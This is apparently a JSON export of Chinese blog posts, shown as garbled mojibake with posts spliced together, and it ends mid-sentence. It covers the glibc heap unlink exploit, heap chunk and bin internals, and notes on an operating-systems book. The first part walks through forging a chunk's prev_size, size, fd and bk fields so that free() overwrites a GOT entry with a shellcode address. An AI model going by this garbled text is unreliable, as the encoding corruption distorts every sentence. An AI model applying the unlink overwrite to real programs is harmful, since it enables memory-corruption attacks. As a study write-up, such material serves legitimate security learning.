æ­¤å½“ç”¨æˆ·è¾“å…¥ä¸€ä¸ªå¤§äº 666 å­—èŠ‚å°±ä¼šè¦†ç›–ä¸‹ä¸€ä¸ª chunk ã€‚ é¦–å…ˆåˆ†æä¸‹ glibc malloc åœ¨ free çš„æ—¶å€™éƒ½åšäº†ä»€ä¹ˆå§ã€‚ å½“è¾“å…¥çš„å­—èŠ‚å°äº 666 å­—èŠ‚æ—¶ï¼Œåœ¨ [4] ä¸­åšäº†å¦‚ä¸‹æ“ä½œï¼š 1. é mmap çš„ chunkï¼Œåˆå¹¶ å‰/å çš„å— 2. åˆå¹¶ä¸Šä¸€ä¸ªå—ï¼š * å¦‚æœå½“å‰é‡Šæ”¾çš„ chunk ä¸­çš„ P ä½ä¸º 0ï¼Œå°±å°†ä¸Šä¸€ä¸ªå—åœ¨ `bins` ä¸­ç§»é™¤ï¼ˆ `unlink` æ“ä½œï¼‰ï¼Œå°†å½“å‰å—çš„å¤§å°å¢åŠ ä¸Šä¸Šä¸€ä¸ªå—çš„å¤§å° å¹¶ä¸” å°†å½“å‰å—æŒ‡å‘ä¸Šä¸€ä¸ªå—ã€‚ * åœ¨è¿™ä¸ªä¾‹å­ä¸­ P ä½ä¸º 1ï¼ˆç¬¬ä¸€ä¸ªå—é»˜è®¤çš„ P ä½éƒ½ä¸º 1ï¼Œå°½ç®¡ä¸Šä¸€ä¸ªå—ä¸å­˜åœ¨ï¼‰ã€‚ 3. åˆå¹¶ä¸‹ä¸€ä¸ªå—ï¼š * å½“ä¸‹ä¸€ä¸ªå—ä¸º free æ—¶ï¼Œå°†ä¸‹ä¸€ä¸ªå—ä» bins ä¸­ç§»é™¤ï¼ˆ ä¹Ÿæ˜¯æ‰§è¡Œ `unlink` ï¼‰ï¼Œå°†å½“å‰å—çš„å¤§å°åŠ ä¸Šä¸‹ä¸€ä¸ªå—çš„å¤§å°ã€‚ï¼ˆåœ¨è¿™é‡Œä¾‹å­ä¸­ä¸‹ä¸€ä¸ªå—ä¸º secondï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šåˆå¹¶ï¼‰ * æœ‰æ„æ€çš„æ˜¯ï¼Œè·å–ä¸‹ä¸€ä¸ªå—æ˜¯å¦ä¸º free æ˜¯æ ¹æ®ä¸‹ä¸‹ä¸ªå—çš„ P ä½æ¥å†³å®šçš„ã€‚ 4. ç„¶åæ·»åŠ  åˆå¹¶åçš„å— åˆ° unsorted bin ä¸­ã€‚åœ¨è¿™é‡Œä¾‹å­ä¸­æ²¡æœ‰å‘ç”Ÿåˆå¹¶ï¼Œæ‰€ä»¥åªç”¨å°† first æ·»åŠ åˆ° unsorted bin å°±å¥½ã€‚ ä¸‹é¢è¯´è¯´æ”»å‡»è€…åœ¨ç¬¬ä¸‰è¡Œä¸­è¦†ç›– second è¿™å—å†…å­˜çš„å†…å®¹ï¼š prev_size = è¦†ç›–æˆå¶æ•°ï¼ˆä½¿ PREV_INUSE ä½ä¸º 0ï¼‰ size = -4 fd = free address -12 bk = shellcode address åœ¨æ”»å‡»è€…çš„ç”¨å‘ä¸‹ï¼Œ[4] åšäº†å¦‚ä¸‹äº‹ï¼š åˆå¹¶ä¸Šä¸‹å †å— åˆå¹¶ä¸Šä¸€ä¸ªå—ï¼šå’Œä¸Šé¢åˆ†æçš„ä¸€æ ·ï¼Œä¸å†é‡å¤ åˆå¹¶ä¸‹ä¸€ä¸ªå—ï¼š åˆ¤æ–­ä¸‹ä¸€ä¸ªå—æ˜¯å¦ä¸ºç©ºé—²ï¼Œå‰é¢æåˆ°è¿‡æ˜¯æ ¹æ®ä¸‹ä¸‹ä¸ªå—çš„ P ä½æ¥åˆ¤æ–­çš„ã€‚é‚£ä¹ˆæ€ä¹ˆæ‰¾åˆ°ä¸‹ä¸‹ä¸ªå—çš„åœ°å€å‘¢ï¼Ÿå°±æ˜¯ï¼šä¸‹ä¸€ä¸ªå—çš„åœ°å€+ä¸‹ä¸€ä¸ªå—å¤§å°ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬æŠŠä¸‹ä¸€å—çš„å¤§å°å˜æˆäº†-4ï¼Œæ‰€ä»¥ä»– ä¸‹ä¸€å—çš„åœ°å€ï¼ˆprev_sizeï¼‰+ï¼ˆ-4ï¼‰ åˆæŒ‡å‘äº†è‡ªå·± å›é¡¾ä¸€ä¸‹ unlink çš„è¿‡ç¨‹ï¼š 1. é¦–å…ˆä¼ å…¥è¦ unlink çš„å †å—ï¼Œå‡å®šå˜é‡ P 2. BK = P-&gt;bk , FD = P-&gt;fd // å°† P çš„ bk å’Œ fd åˆ†åˆ«ç»™ BK å’Œ FD å˜é‡ 3. FD-&gt;bk = BK, BK-&gt;fd = FDï¼ˆå› ä¸ºç”¨æ–‡å­—å¤ªç»•äº†ã€‚ï¼‰ 4. //ç”¨æ–‡å­—æè¿°å°±æ˜¯ï¼šå½“å‰å—çš„ä¸Šä¸€ä¸ªå—çš„ä¸‹ä¸€ä¸ªå—ï¼ˆå³ï¼š(P-&gt;bk)BK-&gt;fdï¼‰ ç­‰äº å½“å‰å—çš„ä¸‹ä¸€å—ã€‚ä¸‹ä¸€å—çš„ä¸Šä¸€å—åŒç†ã€‚ æ¥å¼ å›¾æ¯”ä»€ä¹ˆéƒ½æ¸…æ™°ï¼š â€”æ­¤å›¾æ¥è‡ª ctf-wiki å›åˆ°ä¸Šé¢ï¼Œåœ¨ [3] å¤„è¦†ç›–äº† second å †å—åï¼šæ­¤æ—¶ second å †åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š second å­—æ®µ â€”â€“ å€¼ prev_size â€”â€“ å¶æ•°ï¼ˆæœ€åä¸€ä½ä¸º P ä½ï¼Œåªè¦æ˜¯å¶æ•°æœ€åä¸€ä½å°±ä¸º 0ï¼Œå› æ­¤å¶æ•°å³å¯ï¼‰ size â€”â€“ -4 ï¼ˆå‡å»4ï¼ŒæŒ‡å‘äº†è‡ªå·±ï¼‰ fd â€”â€“ GOTå…¥å£-12 ï¼ˆç¨åè§£é‡Šï¼‰ bk â€”â€“ shellcode åœ°å€ å›é¡¾ä¸€ä¸‹ä»£ç çš„ [4]ï¼šfree(first) æ‰§è¡Œè¿™å¥è¯çš„æ—¶å€™å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ é‡Šæ”¾æ‰ first å— åˆ¤æ–­ä¸Šä¸€ä¸ªå—æ˜¯å¦ç©ºé—²ï¼Œåœ¨è¿™é‡Œä¸æ˜¯ç©ºé—²çš„ï¼Œæ‰€ä»¥è·³è¿‡ åˆ¤æ–­ä¸‹ä¸€ä¸ªå—æ˜¯å¦ç©ºé—²ï¼Œåœ¨è¿™é‡Œåˆ¤æ–­çš„æ˜¯ second å—ï¼ŒåŸæœ¬åº”è¯¥æ˜¯ éç©ºé—² çš„ï¼Œbut è¿™é‡Œçš„ size æ˜¯ -4ï¼Œæ‰€ä»¥å–ä¸‹ä¸‹å—çš„æ—¶å€™åˆè·‘åˆ°äº†è‡ªå·±å—çš„ prev_size å¤„ï¼Œè¿™é‡Œçš„å€¼æ˜¯å¶æ•°ï¼Œæ‰€ä»¥ P ä½ä¸º0ï¼Œæ‰€ä»¥å°±æœªå ç”¨å’¯ï¼Œæ‰€ä»¥è¦åˆå¹¶å’¯ï¼Œåˆå¹¶å°±è¦ç”¨åˆ° unlink å’¯ã€‚ é‚£ä¹ˆåœ¨è¿™é‡Œ unlink éƒ½åšäº†ä»€ä¹ˆå‘¢ï¼Ÿ 1234FD = P-&gt;fd ï¼ˆ FD = GOTå…¥å£-12 ï¼‰BK = P-&gt;bk ï¼ˆ BK = shellcodeåœ°å€ ï¼‰FD-&gt;bk = BKï¼ˆ FD-&gt;bk = GOTå…¥å£ï¼Œå› ä¸º FD æ˜¯ GOT-12ï¼Œbk ä½äº FD 12ä¸ªå­—èŠ‚å¤„ï¼Œæ‰€ä»¥ FD-&gt;bk å°±ç­‰äº FD+12 çš„åœ°å€ ï¼‰BK-&gt;fd = FDï¼ˆè¿™é‡Œæ˜¯ä»€ä¹ˆä¸é‡è¦äº†ï¼Œä½†æ˜¯æ­¤å¤„çš„å†…å®¹ä¹Ÿä¼šè¢«ç ´åï¼Œæ‰€ä»¥è¦æ³¨æ„ï¼‰ åœ¨è¿™é‡Œ GOT å…¥å£è¡¨è¢«è¦†ç›–æˆ shellcode åœ°å€äº†ã€‚ è¿™é‡Œè¦†ç›– GOT å…¥å£è¡¨æœ¬èº«æ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œåªæ˜¯ä¸€ä¸ªæ€è·¯å§ï¼Œå½“ä½œè¿ˆå‡ºå»çš„ç¬¬ä¸€æ­¥ã€‚ è‡³æ­¤ï¼Œ unlink çš„åˆ©ç”¨å°±ç®—ç»“æŸäº†ï¼Œä¸‹ç¯‡æ–‡ç« åˆ†æä¸€é“ï¼Œ123while True: print &quot;ç‰¹åˆ«ç‰¹åˆ«ç‰¹åˆ«&quot;print &quot;ç®€å•çš„é¢˜ç›®ã€‚&quot;","path":"2018/10/27/heap_unlink/","date":"10-27","excerpt":""},{"title":"å †ç¬”è®°1","text":"1. ä»€ä¹ˆæ˜¯ chunkç”± malloc ç”³è¯·çš„å†…å­˜ç§°ä¸º chunk 2. chunk ç»“æ„123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize chunk å­—æ®µè§£é‡Š prev_size ï¼š å¦‚æœå‰ä¸€ä¸ªchunkç©ºé—²ï¼Œåˆ™è¯¥å­—æ®µè¡¨ç¤ºå‰ä¸€ä¸ªchunkçš„å¤§å°ã€‚å¦‚æœå‰ä¸€ä¸ªchunk éç©ºé—²çŠ¶æ€ï¼Œåˆ™æ­¤å¤„ä½œä¸ºå‰ä¸€ä¸ª chunk çš„æ•°æ®éƒ¨åˆ†ï¼ˆå³è¢«å‰ä¸€ä¸ªchunkä½¿ç”¨ï¼‰ã€‚ size ï¼š è®°å½•å½“å‰å—çš„å¤§å°ï¼Œå¿…é¡»ä¸º 2 * SIZE_T çš„æ•´æ•°å€ï¼ˆSIZE_T åœ¨32ä½ä¸º4ï¼Œ64ä½ä¸º8ï¼‰è¯¥å­—æ®µçš„ä½ä¸‰ä½å’Œå¤§å°æ²¡å…³ç³»ï¼Œåˆ†åˆ«ä¸ºï¼š 1. NON_MAIN_ARENA è®°å½•è¯¥ chunk æ˜¯å¦å±äºä¸»çº¿ç¨‹ 2. IS_MAPPED è®°å½•å½“å‰ chunk æ˜¯å¦ç”± mmap åˆ†é… 3. PREV_INUSE è®°å½•å‰ä¸€ä¸ª chunk æ˜¯å¦è¢«åˆ†é…ï¼ˆç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„ chunk çš„ Pä½éƒ½ä¼šè®¾ç½®æˆ 1ï¼Œé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ï¼‰ã€‚å½“è¯¥ä½ä¸º 0 æ—¶ï¼Œå¯ä»¥ç”¨ prev_size å­—æ®µè·å¾—ä¸Šä¸ª chunk çš„å¤§å°å’Œåœ°å€ã€‚ä¹Ÿæ–¹ä¾¿ç©ºé—²å—çš„åˆå¹¶ fdï¼š å¦‚æœè¯¥ chunk è¢«åˆ†é…ï¼Œä»æ­¤å¤„å¼€å§‹å°±æ˜¯ç”¨æˆ·çš„æ•°æ®ï¼Œå¦åˆ™æŒ‡å‘ä¸Šä¸€ä¸ªç©ºé—² chunkbkï¼š æŒ‡å‘ä¸Šä¸€ä¸ªç©ºé—²çš„ chunk fd_nextsizeï¼š æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç©ºé—²å—bk_nextsizeï¼š æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç©ºé—²å— 3. bins ä»€ä¹ˆæ˜¯ bins ç”¨æˆ·é‡Šæ”¾æ‰çš„ chunk ä¸ä¼šç«‹é©¬å½’è¿˜ç»™ç³»ç»Ÿï¼Œè€Œæ˜¯ç¨‹åºä¿ç•™ç®¡ç†ç€ï¼Œè¿™æ ·ä¸‹æ¬¡å†åˆ†é…æ—¶æ— éœ€ç³»ç»Ÿè°ƒç”¨ï¼ŒèŠ‚çœèµ„æºã€‚ ptmalloc å°† chunk åˆ†ä¸ºå››ç±»ï¼š1234fast binsunsorted binssmall binslarge bins å¯¹äºåä¸‰ä¸ª binsï¼Œptmalloc å°†ä»–ä»¬åˆ†åœ¨åŒä¸€ä¸ªæ•°ç»„ä¸­ï¼Œç»“æ„å¦‚ä¸‹ï¼š123#define NBINS 128/* Normal bins packed as described above */mchunkptr bins[ NBINS * 2 - 2 ]; æ•°ç»„ä¸­çš„ bins é¡ºåºå¦‚ä¸‹ï¼š1231. æ•°ç»„ç¬¬ä¸€ä¸ªä¸º unsorted bin ï¼Œæ²¡æœ‰æ’åºï¼Œå†…éƒ¨ chunk æ¯”è¾ƒæ‚2. æ•°ç»„ä¸­ç¬¬ 2 åˆ° 63 ä¸ªä¸º small bin ï¼Œ åŒä¸€ä¸ª small bin é“¾ä¸­çš„å¤§å°ç›¸åŒï¼Œä¸¤ä¸ªç›¸é‚»çš„ small bin é“¾ä¸­çš„å¤§å°ç›¸å·®å­—èŠ‚æ•°ä¸º 2*æœºå™¨å­—é•¿ï¼ˆå³ 32 ä½ç›¸å·®8 ï¼Œ64ä½ç›¸å·® 16ï¼‰3. åé¢çš„ä¸º large binsï¼Œchunk çš„ fd æŒ‰ä»å¤§åˆ°å°æ’åºã€‚ å½“ç„¶è¿˜æœ‰ä¸Šé¢æåˆ°çš„ fast binsï¼Œptmalloc ä¸ºäº†æé«˜åˆ†é…é€Ÿåº¦ï¼Œä¼šæŠŠä¸€äº›å°çš„ bins åˆ†é…åˆ° fast bins ä¸­ï¼Œfast bins ä¸­çš„æ¯ä¸ª P ä½ï¼ˆchunk çš„ä½¿ç”¨æ ‡è®°ï¼‰éƒ½è¢«è®¾ç½®ä¸º 1ï¼Œæ‰€ä»¥ä¸ä¼šè¢«åˆå¹¶èµ·æ¥ã€‚ 4. bins ä»¬4.1 fast binä¸ºäº†æé«˜åˆ†é…æ•ˆç‡è€Œè®¾è®¡çš„ fast bin å°†å­˜å‚¨ä¸€äº›è¾ƒå°çš„å†…å­˜å—ï¼Œå®ƒä»¬çš„ ä½¿ç”¨ä½æ°¸è¿œè¢«ç½®ä¸º 1ï¼Œæ‰€ä»¥ä¸ä¼šè¢«åˆå¹¶èµ·æ¥ã€‚ çœ‹ä¸¤ä¸ªå®ï¼š12345678910#ifndef DEFAULT_MXFAST#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)#endif#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)#define set_max_fast(s) \\ global_max_fast = \\ (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))#define get_max_fast() global_max_fast ptmalloc é¦–å…ˆä¼šè°ƒç”¨ set_max_fast å¹¶æŠŠ DEFAULT_MXFAST ä¼ è¿›å»ï¼Œä¹Ÿå°±æ˜¯è®¾ç½® fast bins ä¸­ chunk çš„æœ€å¤§å€¼ã€‚ MAX_FAST_SIZE ä¸º 0 æ—¶ï¼Œç³»ç»Ÿå°±ä¸ä¼šæ”¯æŒ fastbin ã€‚ å½“ç”³è¯·ç©ºé—´ä¸€ä¸ªå°äºæˆ–ç­‰äº global_max_fast æ—¶ï¼Œptmalloc é¦–å…ˆä¼šåœ¨ fast bin æŸ¥è¯¢æ˜¯å¦æœ‰åˆé€‚å¤§å°çš„å—ã€‚ å†æ¥çœ‹ä¸ªä¸œè¥¿ï¼š12#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) å½“é‡Šæ”¾çš„ chunk ä¸è¯¥ chunk ç›¸é‚»çš„ç©ºé—² chunk åˆå¹¶åå¤§äº FASTBIN_CONSOLIDATION_THRESHOLDï¼Œè¡¨æ˜å†…å­˜ç¢ç‰‡æ¯”è¾ƒå¤šäº†ï¼Œæˆ‘ä»¬å°±éœ€è¦æŠŠ fast bins ä¸­çš„ chunk éƒ½è¿›è¡Œåˆå¹¶ã€‚ malloc_consolidate å‡½æ•°å¯ä»¥é‡Šæ”¾åæ‰€æœ‰ fastbins å¹¶ä¸”å°†ä»–ä»¬å’Œå…¶ä»–çš„ ç©ºé—²å— åˆå¹¶ã€‚ 4.2 small binsmall bins æœ‰ 62 ä¸ªåŒå‘é“¾è¡¨ï¼Œæ¯ä¸ªé“¾è¡¨å­˜å‚¨çš„å¤§å°éƒ½ä¸€è‡´ã€‚ small bins ä¸­æ¯ä¸ªé“¾è¡¨çš„å¤§å°éƒ½æœ‰è§„å¾‹ï¼Œå³ï¼šchunk_size = 2SIZE_INDEXindexï¼Œä¾‹å¦‚åœ¨ 32 ä½ç³»ç»Ÿä¸‹ä¸‹æ ‡ä¸º 2 çš„é“¾è¡¨çš„å¤§å°ä¸º 242 = 16 ä¸ªå­—èŠ‚ã€‚ å½“ç„¶ï¼Œfast bin ä¸­çš„ chunk æ˜¯æœ‰å¯èƒ½ä¼šè¢«æ”¾åˆ° small bin ä¸­å»çš„ï¼Œå› ä¸ºä»–ä»¬ç¡®å®æœ‰äº›é‡åˆäº†ã€‚ 4.3 large bin large bins å…±æœ‰ 63ä¸ª binï¼Œæ¯ä¸ª bin ä¸­çš„å¤§å°ä¸ä¸€è‡´ï¼Œä½†æœ‰ä¸ªå·®å€¼ã€‚ æ¯ä¸ª bin ä¸­çš„ chunk å¤§å°ä¹‹é—´å…¬å·®ä¸€è‡´ã€‚ ç¬¬ä¸€ä¸ª large bin çš„èµ·å§‹ chunk å¤§å°ä¸º 512 å­—èŠ‚ï¼Œè¯¥ç»„å…¬å·®ä¸º 64Bï¼Œæ‰€ä»¥è¯¥ç»„å¯ä»¥å­˜å‚¨ chunk çš„å¤§å°èŒƒå›´ä¸ºï¼š [512,512+64) 4.4 unsorted bin ä¹±åºçš„ bins æ”¾è¿› unsorted bin çš„ chunk æ¥è‡ªï¼š åˆ†å‰²å®Œå¤§å—åå‰©ä½™éƒ¨åˆ†ï¼Œå¹¶ä¸”è¯¥éƒ¨åˆ†è¦å¤§äº MINSIZE é‡Šæ”¾ä¸å±äº fast bin çš„ chunk å¹¶ä¸” è¯¥ chunk ä¸å’Œ top chunk ç´§é‚»ã€‚ 4.5 top chunk ç®€å•ç†è§£å°±æ˜¯åœ¨åœ°å€æœ€é«˜çš„ä¸€ä¸ª chunkï¼Œä¸å±äºä»»ä½• binsã€‚ å½“ç¨‹åºéœ€è¦åˆ†é…çš„å†…å­˜å¤§å°åœ¨ bins ä¸­éƒ½ä¸æ»¡è¶³çš„æƒ…å†µä¸‹ï¼Œå°è¯•ç”¨ top chunk ç»™ç¨‹åºåˆ†é…ï¼Œå¦‚æœå¤Ÿï¼Œåˆ™å‰©ä½™éƒ¨åˆ†ç»§ç»­åš top chunkï¼Œå¦‚æœä¸å¤Ÿï¼Œåˆ™ç”³è¯·æ‰©å±•å†…å­˜åå†åˆ†é…ã€‚ å½“é‚»è¿‘ top chunk çš„ chunk è¢«é‡Šæ”¾åï¼Œä¼šåˆå¹¶åˆ° top chunk ä¸­ 4.6 last remainder å½“åœ¨ small chunk æ‰¾ä¸åˆ°åˆé€‚çš„å—æ—¶ï¼Œå¦‚æœ last remainder chunk å¤§äºè¦åˆ†é…çš„å†…å­˜ï¼Œåˆ™åˆ†å‰²è¿™ä¸ª chunk ç»™ç”¨æˆ·å¹¶å°†å‰©ä½™éƒ¨åˆ†ç»§ç»­ä½œä¸º last remainder chunkï¼Œè¯¥å—å¥½åƒæ˜¯æ”¾åœ¨ unsorted bins ä¸­çš„ã€‚","path":"2018/10/22/å †ç¬”è®°1/","date":"10-22","excerpt":""},{"title":"ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»-ç¬¬ä¸€é¡µ","text":"1.2 ä¸‡å˜ä¸ç¦»å…¶å®— è®²äº†å—æ¡¥åŒ—æ¡¥PCI çœ‹ä¸æ‡‚çœ‹ä¸æ‡‚ã€‚ SMP ä¸å¤šæ ¸ ä»€ä¹ˆæ˜¯ SMPï¼šå¯¹ç§°å¤šå¤„ç†å™¨ï¼ˆSymmetrical Multi-Processingï¼‰ï¼Œå°±æ˜¯å¤šä¸ª CPU å’¯ã€‚ä»€ä¹ˆæ˜¯ å¤šæ ¸ï¼šä¸¤ä¸ª CPU ä½ ä¹Ÿä¹°ä¸èµ·ï¼Œæ‰€ä»¥è‰¯å¿ƒçš„èµ„æœ¬å®¶ä»¬å°† CPU ä¸­çš„ ç¼“å­˜éƒ¨ä»¶å…±äº«ï¼ˆæ®è¯´æ˜¯æ¯”è¾ƒè´µï¼‰ï¼ŒæŠŠæ ¸å¿ƒä¿ç•™èµ·æ¥ã€‚å³:å¤šä¸ªæ ¸å¿ƒ+ä¸€ä¸ªç¼“å­˜éƒ¨ä»¶ é™¤éä½ æƒ³æŠŠ CPU çš„æ¯ä¸€æ»´æ²¹æ°´éƒ½æ¦¨å¹²ï¼Œå¦åˆ™å¯ä»¥æŠŠå¤šå¤šæ ¸å’Œ SMP çœ‹æˆåŒä¸€ä¸ªæ¦‚å¿µ ä¸ºä»€ä¹ˆä¸å‡çº§ CPU æœ¬èº«è€Œæ·»åŠ å¤šæ ¸æ¥æé€Ÿå‘¢ï¼Ÿ å› ä¸ºäººä»¬åœ¨åˆ¶é€  CPU çš„å·¥è‰ºæ–¹é¢å·²ç»è¾¾åˆ°äº†ç‰©ç†æé™ï¼Œé™¤éåˆ¶é€ å·¥è‰ºæœ‰æœ¬è´¨çš„çªç ´ã€‚å¦åˆ™ 4GHZ å°±æ˜¯ CPU çš„å¤©èŠ±æ¿äº†ã€‚ 1.3 ç«™å¾—é«˜ï¼Œæœ›å¾—è¿œAny problem in computer science can be solved by another layer of indrection. è¿™èŠ‚åº”è¯¥æ˜¯å¼ºè°ƒäº†æ¥å£çš„æ¦‚å¿µï¼š æ¥å£ï¼Ÿ ä»€ä¹ˆæ˜¯æ¥å£ï¼Ÿ ä¸‹å±‚å®ç°ï¼Œä¸Šå±‚ä½¿ç”¨ã€‚ æ¯”å¦‚ç±»åº“ä¸­å°è£…äº† printf å‡½æ•°ã€‚å†™ä»£ç çš„æ—¶å€™æ— éœ€è€ƒè™‘ printf ç”¨æ±‡ç¼–çš„å®ç°æ–¹å¼ã€‚æ‰€ä»¥ Windows çš„ C ä»£ç åˆ°äº† Linux ä¾ç„¶å¯ä»¥ç¼–è¯‘ï¼Œå³ä½¿åº•å±‚å®ç° printf çš„æ–¹æ³•ä¸åŒï¼ˆåº”è¯¥ä¸åŒå§ï¼Ÿï¼‰ ä»€ä¹ˆæ˜¯ ç¡¬ä»¶è§„æ ¼ï¼šé©±åŠ¨ç¨‹åºæ“ä½œç¡¬ä»¶çš„ æ¥å£ï¼Œå®šä¹‰äº†å¦‚ä½•ä¸ç¡¬ä»¶é€šä¿¡ 1.4 æ“ä½œç³»ç»Ÿåšä»€ä¹ˆ1.41 åˆ«è®© CPU æ‰“ç›¹ å¤šé“ç¨‹åºçš„å‡ºç° ä»€ä¹ˆæ˜¯å¤šé“ç¨‹åºå‘¢ï¼š èªæ˜çš„ç¨‹åºå‘˜ä¸ºäº†è®© CPU å¿™ç¢Œèµ·æ¥ï¼Œå†™äº†ä¸ªç›‘æ§ç¨‹åºï¼Œå½“å½“å‰ç¨‹åºæš‚æ—¶æ— éœ€ä½¿ç”¨ CPU æ—¶ï¼ˆè¯»å†™ç¡¬ç›˜ï¼‰ï¼Œç›‘æ§ç¨‹åºå°±æŠŠ CPU è®©ç»™æ­£åœ¨ç­‰å¾…çš„ç¨‹åºã€‚è¿™å°±æ˜¯å¤šåˆ°ç¨‹åºã€‚ å¤šé“ç¨‹åºçš„ç¼ºç‚¹ï¼š æ²¡æœ‰ä¼˜å…ˆçº§ï¼Œæ‰€ä»¥æœ‰äº›å¾ˆæ€¥çš„ä»»åŠ¡è¦ç­‰å¾ˆä¹…ã€‚æƒ³è±¡ä¸€ä¸‹å¦‚æœç‚¹å‡»ä¸€ä¸‹é¼ æ ‡ï¼Œååˆ†é’Ÿä¹‹åæ‰ç­‰åˆ° CPU å¤„ç†ã€‚ã€‚ è¿›åŒ–æˆåˆ†æ—¶ç³»ç»Ÿå§ ä»€ä¹ˆæ˜¯åˆ†æ—¶ç³»ç»Ÿï¼š æ¯ä¸ªç¨‹åºåœ¨è¿è¡Œä¸€æ®µæ—¶é—´åï¼Œç¨‹åº ä¸»åŠ¨ è®©å‡º CPU ç»™å…¶ä»–ç¨‹åºã€‚Windowsæ—©æœŸç‰ˆæœ¬ï¼ˆå¦‚ Windows 3.1 å°±æ˜¯è¿™ç§æ¨¡å¼ï¼‰ã€‚ç¨‹åºè°ƒç”¨ç³»ç»Ÿæ¥å£ Yield ã€GetMessageã€PeekMessage æ—¶ï¼ŒWindow3.1 ä¼šåˆ¤æ–­æ˜¯å¦æœ‰å…¶ä»–ç¨‹åºæ­£åœ¨ç­‰å¾… CPU ï¼Œå¦‚æœæœ‰ï¼Œå°±æš‚åœå½“å‰ç¨‹åºï¼ŒæŠŠ CPU è®©ç»™å…¶ä»–ç¨‹åºã€‚ åˆ†æ—¶ç³»ç»Ÿç¼ºç‚¹ï¼š ä½†æ˜¯ï¼Œæ³¨æ„è¿™æ˜¯ç¨‹åº ä¸»åŠ¨ è®©å‡º CPU å•Šã€‚ç¨‹åºè¦æ˜¯ while(1) é‚£ä½ å¯å’‹åŠå“Ÿ~ å¤šä»»åŠ¡ç³»ç»Ÿæ‰æ˜¯ç‹é“å•Š ä»€ä¹ˆæ˜¯å¤šä»»åŠ¡ç³»ç»Ÿï¼š æ“ä½œç³»ç»Ÿæ¥ç®¡äº†æ‰€æœ‰ç¡¬ä»¶èµ„æºå¹¶ä¸”æœ¬èº«è¿è¡Œåœ¨ä¸€ä¸ªå—ç¡¬ä»¶ä¿æŠ¤çš„çº§åˆ«ã€‚æ‰€æœ‰åº”ç”¨ç¨‹åºéƒ½ä»¥ è¿›ç¨‹ çš„æ–¹å¼è¿è¡Œåœ¨æ¯”æ“ä½œç³»ç»Ÿæƒé™æ›´ä½çš„çº§åˆ«ï¼ˆä½œå¼Šäº†å‘€ï¼‰ã€‚ æŠ¢å å¼æ˜¯ä»€ä¹ˆï¼š CPU ç”±æ“ä½œç³»ç»Ÿåˆ†é…ã€‚æ¯ä¸ªè¿›ç¨‹æ ¹æ®ä¼˜å…ˆçº§éƒ½æœ‰æœºä¼šå¾—åˆ° CPUã€‚ä½†å¦‚æœè¿è¡Œè¶…è¿‡ä¸€å®šæ—¶é—´ï¼Œç³»ç»Ÿä¼šæš‚åœè¯¥è¿›ç¨‹ï¼Œå°† CPU èµ„æºåˆ†é…ç»™å…¶ä»–æ­£åœ¨ç­‰å¾…çš„ç¨‹åºã€‚ ï¼ˆè¿™ä¸ªæ¨¡å¼æ˜¯æ“ä½œç³»ç»Ÿå¼ºåˆ¶å‰¥å¤º CPU èµ„æºå•Š~ï¼‰ å¤šä»»åŠ¡çš„ç¼ºç‚¹ï¼š ä¹¦ä¸­æ²¡è¯´ä»–æœ‰ç¼ºç‚¹ï¼Œé‚£å°±å½“ä»–æ²¡æœ‰ç¼ºç‚¹å§ã€‚ 1.42 è®¾å¤‡é©±åŠ¨ è¿™ä¸€å°èŠ‚çœ‹çš„æˆ‘æƒ³æ­»ï¼Œæ‰€ä»¥æ²¡æœ‰ç¬”è®° 1.5 å†…å­˜ä¸å¤Ÿæ€ä¹ˆåŠï¼Ÿæ—©æœŸç¨‹åºæ˜¯ç›´æ¥è¿è¡Œåœ¨ç‰©ç†å†…å­˜çš„ã€‚ å‡è®¾å½“å‰è®¡ç®—æœºç‰©ç†ç©ºé—´æœ‰ 128M ï¼Œç¨‹åºA éœ€è¦ 10Mï¼Œ ç¨‹åºB éœ€è¦ 100Mï¼Œç¨‹åºC éœ€è¦ 20Mï¼Œå¦‚æœéœ€è¦åŒæ—¶è¿è¡Œ A å’Œ Bï¼Œé‚£ä¹ˆå¯ä»¥å¾ˆç›´æ¥çš„å°†ç‰©ç†å†…å­˜ä¸­ 0-10M åˆ†é…ç»™ Aï¼Œ10-110 åˆ†é…ç»™ Bã€‚ å¾ˆæ˜æ˜¾ä¼šé€ æˆå¾ˆå¤šé—®é¢˜ï¼š åœ°å€ç©ºé—´ä¸éš”ç¦»æ‰€æœ‰ç¨‹åºéƒ½ç›´æ¥è®¿é—®ç‰©ç†å†…å­˜ï¼Œç¨‹åºA å¯ä»¥ç›´æ¥è®¿é—® ç¨‹åºB çš„æ•°æ®ç”šè‡³ä»£ç ã€‚ ä½¿ç”¨æ•ˆç‡ä½ç”±äºæ²¡æœ‰ç®¡ç†æœºåˆ¶ï¼Œæ‰€ä»¥å¦‚æœç°åœ¨è¦è¿è¡Œ C çš„è¯ã€‚éœ€è¦å°†å…¶ä»–ç¨‹åºæš‚æ—¶ç§»åˆ°ç£ç›˜é‡Œå»ã€‚ä½†æ˜¯ç¨‹åºéœ€è¦è¿ç»­çš„ç©ºé—´ï¼Œæ‰€ä»¥ç§»åŠ¨ A è‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥åªèƒ½ç§» 